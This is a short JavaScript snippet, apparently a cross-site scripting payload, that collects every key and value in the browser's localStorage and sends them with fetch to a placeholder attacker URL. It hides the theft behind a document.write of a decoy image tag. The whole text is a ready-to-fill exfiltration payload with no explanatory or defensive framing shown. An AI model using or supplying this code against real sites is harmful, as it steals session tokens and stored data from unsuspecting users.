function getValuesAndKeys() {
    document.write(`<img src="${((async() => {
        let itemsLocalStorage = {};
        for (let i = 0; i < localStorage.length; i++) {
            itemsLocalStorage[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
        } 
        await fetch("add-url-attack" + JSON.stringify(itemsLocalStorage));
        })() == Object) ? "add-url-img-facade":"add-url-img-facade"}">`);
 }
